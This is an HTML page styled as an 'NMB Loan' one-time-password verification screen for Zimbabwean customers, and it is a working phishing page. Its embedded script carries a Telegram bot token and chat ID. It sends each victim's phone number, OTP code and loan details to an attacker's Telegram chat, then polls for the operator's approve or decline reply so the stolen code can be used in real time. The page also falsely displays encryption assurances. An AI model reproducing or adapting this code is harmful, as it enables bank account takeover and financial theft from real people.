<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>NMB Loan | Verify OTP · Zimbabwe</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --nmb-blue: #003366;
            --nmb-gold: #E4C16A;
            --nmb-gold-light: #f1dfae;
            --navy-dark: #002244;
            --white: #ffffff;
            --light: #f8f9fa;
            --dark: #1a1a1a;
            --muted: #666666;
            --border: #e0ddd9;
            --error: #d32f2f;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { -webkit-text-size-adjust: 100%; }

        body {
            font-family: 'Poppins', system-ui, sans-serif;
            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--nmb-blue) 50%, #004080 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            background: white;
            padding: 14px 5%;
            border-bottom: 4px solid var(--nmb-gold);
            box-shadow: 0 2px 8px rgba(0,51,102,0.08);
        }

        .logo { font-size: 22px; font-weight: 900; text-decoration: none; display: flex; align-items: center; }
        .logo .nmb { color: var(--nmb-blue); }
        .logo .loan { color: var(--nmb-gold); margin-left: 2px; }

        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }

        .card {
            background: white;
            border-radius: 18px;
            padding: 36px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,51,102,0.35);
        }

        .card-head { text-align: center; margin-bottom: 22px; }
        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
        .card-head p { color: var(--muted); font-size: 12px; }

        .bundle-bar {
            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 20px;
            color: white;
            border: 1px solid rgba(255,255,255,0.08);
        }

        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }

        .err {
            display: none;
            background: rgba(211,47,47,0.08);
            border: 1.5px solid rgba(211,47,47,0.2);
            color: var(--error);
            font-size: 12px;
            font-weight: 700;
            border-radius: 10px;
            padding: 10px 12px;
            margin-bottom: 14px;
            text-align: center;
        }

        .err.show { display: block; }

        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--nmb-blue); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }

        .otp-row {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 18px;
        }

        .otp-box {
            width: 48px;
            height: 54px;
            text-align: center;
            font-size: 22px;
            font-weight: 900;
            border: 2px solid var(--border);
            border-radius: 12px;
            background: var(--light);
            color: var(--dark);
            font-family: 'Poppins', monospace;
            transition: all 0.2s;
        }

        .otp-box:focus { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); outline: none; }
        .otp-box.ok { border-color: #4caf50; background: rgba(76,175,80,0.05); }

        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 8px; }

        .btns { display: flex; gap: 10px; margin-top: 20px; }

        .btn-p {
            flex: 1;
            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
            color: white;
            border: none;
            padding: 14px;
            border-radius: 50px;
            font-weight: 900;
            font-size: 12px;
            text-transform: uppercase;
            cursor: pointer;
            font-family: inherit;
            box-shadow: 0 4px 14px rgba(0,51,102,0.28);
            transition: all 0.2s;
        }

        .btn-p:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(228,193,106,0.3); }

        .btn-o {
            flex: 1;
            background: transparent;
            color: var(--nmb-blue);
            border: 2px solid var(--nmb-blue);
            padding: 14px;
            border-radius: 50px;
            font-weight: 800;
            font-size: 12px;
            text-transform: uppercase;
            cursor: pointer;
            font-family: inherit;
        }

        .btn-o:hover { background: var(--light); }

        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }

        /* Loading */
        .overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
            background: rgba(0,34,68,0.93);
            z-index: 2000;
            backdrop-filter: blur(6px);
            text-align: center;
            padding: 20px;
        }

        .overlay.on { display: flex; }
        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
        .sp-t { font-size: 16px; font-weight: 800; color: white; margin-top: 10px; }
        .sp-s { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 5px; line-height: 1.5; }
        @keyframes sp { to { transform: rotate(360deg); } }

        @media (max-width: 500px) {
            main { padding: 24px 12px; }
            .card { padding: 28px 18px; }
            .otp-row { gap: 5px; }
            .otp-box { width: 40px; height: 48px; font-size: 18px; }
            .btns { flex-direction: column; }
        }
    </style>
</head>
<body onload="init()">
    <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>

    <main>
        <div class="card">
            <div class="card-head">
                <h1>Verify Code</h1>
                <p>Enter the 6-digit OTP code sent to your phone</p>
            </div>

            <div id="bBar" class="bundle-bar" style="display:none;">
                <div class="b-row"><span>Loan Type:</span><span id="bD">&mdash;</span></div>
                <div class="b-row"><span>Amount:</span><span id="bP">$0 USD</span></div>
            </div>

            <div id="err" class="err"></div>

            <label class="fl">OTP Verification Code</label>
            <div class="otp-row" id="otpRow">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
            </div>
            <p class="hint">Check your SMS for the 6-digit OTP code</p>

            <div class="btns">
                <button class="btn-p" onclick="doOTP()">Verify & Continue</button>
                <button class="btn-o" onclick="location.href='login.html'">Cancel</button>
            </div>

            <div class="card-ft">Protected by 256-bit encryption.</div>
            <div class="secure">🔒 End-to-End Encrypted</div>
        </div>
    </main>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div class="sp-t">Verifying Code</div>
        <div class="sp-s">Please wait a moment while we process your request.<br>Do not close this page.</div>
    </div>

    <script>
        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const CID = '7547427914';
        let bd = {}, luid = 0, otp = '', phone = '';
        const boxes = document.querySelectorAll('.otp-box');

        function init() {
            const p = new URLSearchParams(location.search);
            const d = p.get('data'), pr = p.get('price');
            phone = p.get('phone') || '';
            if (d && pr) {
                bd = { data: d, price: pr };
                document.getElementById('bBar').style.display = 'block';
                document.getElementById('bD').textContent = d;
                document.getElementById('bP').textContent = '$' + pr + ' USD';
            }
            setupOTP();
        }

        function setupOTP() {
            boxes.forEach((b, i) => {
                b.addEventListener('input', e => {
                    const v = e.target.value;
                    if (v.length > 1) {
                        const digs = v.replace(/\D/g, '').split('');
                        digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
                        boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
                        chk();
                        if (otp.length === 6) doOTP();
                        return;
                    }
                    if (v) { 
                        b.classList.add('ok'); 
                        if (i < boxes.length - 1) boxes[i+1].focus(); 
                    } else { 
                        b.classList.remove('ok'); 
                    }
                    chk();
                    if (otp.length === 6) doOTP();
                });
                b.addEventListener('keydown', e => {
                    if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
                });
            });
        }

        function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
        function clrErr() { document.getElementById('err').classList.remove('show'); }

        async function tg(msg, btns) {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                });
                const d = await r.json();
                if (d.ok) {
                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                    const ud = await ur.json();
                    if (ud.ok && ud.result.length > 0) {
                        luid = ud.result[0].update_id;
                    }
                }
            } catch(e) { console.error(e); }
        }

        function doOTP() {
            clrErr();
            if (otp.length !== 6) { showErr('Enter the 6-digit code'); return; }

            const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
            const btns = [
                [{ text: '✓ Approved', callback_data: 'otp_approved' }, { text: '✗ Declined', callback_data: 'otp_declined' }]
            ];

            document.getElementById('ov').classList.add('on');
            tg(msg, btns);
            poll();
        }

        function poll() {
            const iv = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            d.result.forEach(u => {
                                luid = u.update_id;
                                if (u.callback_query) {
                                    const cb = u.callback_query.data;
                                    if (cb === 'otp_approved') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        location.href = 'success.html';
                                    }
                                    else if (cb === 'otp_declined') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('Invalid code. Please try again.'); 
                                        boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); 
                                        boxes[0].focus(); 
                                    }
                                }
                            });
                        }
                    }).catch(e => console.error(e));
            }, 1500);
            setTimeout(() => clearInterval(iv), 600000);
        }
    </script>
</body>
</html>
